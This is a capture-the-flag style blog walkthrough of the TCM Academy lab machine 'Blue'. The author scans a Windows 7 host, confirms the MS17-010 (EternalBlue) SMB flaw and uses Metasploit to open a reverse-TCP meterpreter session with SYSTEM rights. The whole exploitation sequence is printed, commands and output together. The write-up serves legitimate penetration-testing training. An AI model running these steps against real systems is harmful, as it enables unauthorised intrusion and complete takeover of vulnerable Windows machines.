---
title: Write-up Blue on TCM
author: eMVee
date: 2022-08-23 21:00:00 +0800
categories: [CTF, TCM]
tags: [PNPT, ms17-010, Eternal Blue]
render_with_liquid: false
---

Another machine from TCM academy during the PNPT (Practical Ethical Hacking) is the machine called **Blue**. A well-known name that I think is also used at Hack The Box to point out eternal blue vulnerability. Let's find out if it is the famous eternal blue vulnerability on that machine.
## PNPT - Blue writeup

After booting both machine in my pentest labenvironment I checked my IP address on my Kali machine with **ip a**.
~~~
┌──(emvee㉿kali)-[~]
└─$ ip a            
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:c7:ee:60 brd ff:ff:ff:ff:ff:ff
    inet 192.168.138.4/24 brd 192.168.138.255 scope global dynamic noprefixroute eth0
       valid_lft 515sec preferred_lft 515sec
    inet6 fe80::a00:27ff:fec7:ee60/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
~~~
Since I don't know the IP address of the target in my lab environment I have to run a ping sweep (or I could guess the IP address) to identify the IP address.
~~~                              
┌──(emvee㉿kali)-[~]
└─$ fping 192.168.138.0/24 -ag 2>/dev/null
192.168.138.1
192.168.138.2
192.168.138.3
192.168.138.4
192.168.138.9
~~~
I noticed a new IP address in my network which was shown with my ping sweep. As soon as I had identified the IP address of the target, I assign it to a variable called **ip** in my CLI.
~~~
┌──(emvee㉿kali)-[~]
└─$ ip=192.168.138.9
~~~
After creating a variable named **ip** with the IP address assigned, I started a ping request to see if the machine is responding to ping requests.
~~~
┌──(emvee㉿kali)-[~]
└─$ ping -c3 $ip            
PING 192.168.138.9 (192.168.138.9) 56(84) bytes of data.
64 bytes from 192.168.138.9: icmp_seq=1 ttl=128 time=0.454 ms
64 bytes from 192.168.138.9: icmp_seq=2 ttl=128 time=0.636 ms
64 bytes from 192.168.138.9: icmp_seq=3 ttl=128 time=1.06 ms

--- 192.168.138.9 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2066ms
rtt min/avg/max/mdev = 0.454/0.716/1.059/0.253 ms
~~~
As espected based on the name **blue** that the target runs a Windows Operating System, the ping request confirmed my thoughts since I noticed the value 128 in the ttl field.
~~~
┌──(emvee㉿kali)-[~]
└─$ sudo nmap -sC -sV -T4 -A -O -p- $ip
[sudo] password for emvee: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-23 10:26 CEST
Nmap scan report for 192.168.138.9
Host is up (0.00058s latency).
Not shown: 65526 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Ultimate 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
MAC Address: 08:00:27:2A:95:91 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Microsoft Windows 7|2008|8.1
OS CPE: cpe:/o:microsoft:windows_7::- cpe:/o:microsoft:windows_7::sp1 cpe:/o:microsoft:windows_server_2008::sp1 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_8.1
OS details: Microsoft Windows 7 SP0 - SP1, Windows Server 2008 SP1, Windows Server 2008 R2, Windows 8, or Windows 8.1 Update 1
Network Distance: 1 hop
Service Info: Host: WIN-845Q99OO4PP; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2022-08-23T14:28:00
|_  start_date: 2022-08-23T14:25:03
|_clock-skew: mean: 7h19m56s, deviation: 2h18m34s, median: 5h59m55s
| smb-os-discovery: 
|   OS: Windows 7 Ultimate 7601 Service Pack 1 (Windows 7 Ultimate 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1
|   Computer name: WIN-845Q99OO4PP
|   NetBIOS computer name: WIN-845Q99OO4PP\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-08-23T10:28:00-04:00
|_nbstat: NetBIOS name: WIN-845Q99OO4PP, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:2a:95:91 (Oracle VirtualBox virtual NIC)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled but not required

TRACEROUTE
HOP RTT     ADDRESS
1   0.58 ms 192.168.138.9

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 103.68 seconds

~~~
The nmap scan was shown the famous ports for the SMB service which let to the eternal blue vulnerability. I added the following information to my notes:
* Windows 7 Ultimate 7601 Service Pack 1
* WIN-845Q99OO4PP
* workgroup: WORKGROUP
* Poort,  135, 139, 445 
   * SMB service
   * SMB Security mode 2.1:

Based on this information I started using my Google Fu "[windows 7 ultimate 7601 service pack exploit](https://www.google.com/search?q=windows+7+ultimate+7601+service+pack+exploit)" to find the famous vulnerability which I could use to gain access to the system. One of the top results was the [rapid7](https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/) pages about the ms17-010 eternal blue vulnerability. I started msfconsole with the **-q** flag for the quiet mode to skip the great banner from MetaSploit.


~~~
┌──(emvee㉿kali)-[~]
└─$ msfconsole -q
msf6 >

~~~

To search for the exploit I use the following command **search ms17_010**
~~~
msf6 > search ms17_010

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection


Interact with a module by name or index. For example info 3, use 3 or use auxiliary/scanner/smb/smb_ms17_010

msf6 > 
~~~
MetaSploit returned four items. I noticed tha SMB RCE Detection module as a scanner. I decided to run this to see if the machine is vulnerable.
To select this module I enter the command **use 3** and then I would like to **show options** to see what I can and have to configure to run this module.

~~~
msf6 > use 3
msf6 auxiliary(scanner/smb/smb_ms17_010) > show options

Module options (auxiliary/scanner/smb/smb_ms17_010):

   Name         Current Setting                                                 Required  Description
   ----         ---------------                                                 --------  -----------
   CHECK_ARCH   true                                                            no        Check for architecture on vulnerable hosts
   CHECK_DOPU   true                                                            no        Check for DOUBLEPULSAR on vulnerable hosts
   CHECK_PIPE   false                                                           no        Check for named pipe on vulnerable hosts
   NAMED_PIPES  /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check
   RHOSTS                                                                       yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT        445                                                             yes       The SMB service port (TCP)
   SMBDomain    .                                                               no        The Windows domain to use for authentication
   SMBPass                                                                      no        The password for the specified username
   SMBUser                                                                      no        The username to authenticate as
   THREADS      1                                                               yes       The number of concurrent threads (max one per host)
~~~
It looks like I only have to set the remote host by entering the following command: **set RHOSTS 192.168.138.9**.
~~~
msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS 192.168.138.9
RHOSTS => 192.168.138.9
~~~
Then I double check all the options and if correct I execute the module by the command **run**.
~~~
msf6 auxiliary(scanner/smb/smb_ms17_010) > options

Module options (auxiliary/scanner/smb/smb_ms17_010):

   Name         Current Setting                                                 Required  Description
   ----         ---------------                                                 --------  -----------
   CHECK_ARCH   true                                                            no        Check for architecture on vulnerable hosts
   CHECK_DOPU   true                                                            no        Check for DOUBLEPULSAR on vulnerable hosts
   CHECK_PIPE   false                                                           no        Check for named pipe on vulnerable hosts
   NAMED_PIPES  /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check
   RHOSTS       192.168.138.9                                                   yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT        445                                                             yes       The SMB service port (TCP)
   SMBDomain    .                                                               no        The Windows domain to use for authentication
   SMBPass                                                                      no        The password for the specified username
   SMBUser                                                                      no        The username to authenticate as
   THREADS      1                                                               yes       The number of concurrent threads (max one per host)

msf6 auxiliary(scanner/smb/smb_ms17_010) > run

[+] 192.168.138.9:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)
[*] 192.168.138.9:445     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
~~~
It looks like the machine is indeed vulnerable for MS17-010! 
Now it is time to select the exploit which can give me a meterpreter shell. I have to search again in Metasploit and select the exploit by using the **use** command.
~~~
msf6 auxiliary(scanner/smb/smb_ms17_010) > search ms17_010

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection


Interact with a module by name or index. For example info 3, use 3 or use auxiliary/scanner/smb/smb_ms17_010

msf6 auxiliary(scanner/smb/smb_ms17_010) > use 0
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
~~~
To see which options are available for the exploit I run the command **show options**
~~~
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.138.4    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target
~~~
The most settings are correct already, the only things which is mising is the remote host.
Since I only have to set the remote host I can enter the following command: **set RHOSTS 192.168.138.9**.
~~~
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.138.9
RHOSTS => 192.168.138.9
~~~ 
To run the exploit against the target, I only have to enter **run** and press the enter key on my keyboard. So let's do this!
~~~
msf6 exploit(windows/smb/ms17_010_eternalblue) > run

[*] Started reverse TCP handler on 192.168.138.4:4444 
[*] 192.168.138.9:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 192.168.138.9:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)
[*] 192.168.138.9:445     - Scanned 1 of 1 hosts (100% complete)
[+] 192.168.138.9:445 - The target is vulnerable.
[*] 192.168.138.9:445 - Connecting to target for exploitation.
[+] 192.168.138.9:445 - Connection established for exploitation.
[+] 192.168.138.9:445 - Target OS selected valid for OS indicated by SMB reply
[*] 192.168.138.9:445 - CORE raw buffer dump (38 bytes)
[*] 192.168.138.9:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 55 6c 74 69 6d 61  Windows 7 Ultima
[*] 192.168.138.9:445 - 0x00000010  74 65 20 37 36 30 31 20 53 65 72 76 69 63 65 20  te 7601 Service 
[*] 192.168.138.9:445 - 0x00000020  50 61 63 6b 20 31                                Pack 1          
[+] 192.168.138.9:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 192.168.138.9:445 - Trying exploit with 12 Groom Allocations.
[*] 192.168.138.9:445 - Sending all but last fragment of exploit packet
[*] 192.168.138.9:445 - Starting non-paged pool grooming
[+] 192.168.138.9:445 - Sending SMBv2 buffers
[+] 192.168.138.9:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 192.168.138.9:445 - Sending final SMBv2 buffers.
[*] 192.168.138.9:445 - Sending last fragment of exploit packet!
[*] 192.168.138.9:445 - Receiving response from exploit packet
[+] 192.168.138.9:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 192.168.138.9:445 - Sending egg to corrupted connection.
[*] 192.168.138.9:445 - Triggering free of corrupted buffer.
[*] Sending stage (200774 bytes) to 192.168.138.9
[*] Meterpreter session 1 opened (192.168.138.4:4444 -> 192.168.138.9:49159) at 2022-08-23 12:26:57 +0200
[+] 192.168.138.9:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.138.9:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.138.9:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter > 
~~~
The meterpreter connection was established and waiting for input.
I would like to know on what system I am working, so I entered **sysinfo** into the meterpreter session and hit the enter key.

~~~
meterpreter > sysinfo
Computer        : WIN-845Q99OO4PP
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 0
Meterpreter     : x64/windows
~~~
As expected I am working on the Windows 7 machine. To control the system fully I love to have a shell. By entering **shell** it pops a shell so I van use the normal Windows commands such as whoami.

~~~
meterpreter > shell
Process 1260 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>
~~~
Yeah! I've owned the system by gaining access as "nt authority\system"!!! Okay, it was pretty easy with MetaSploit, but still it was feeling well to capture this machine pretty fast.



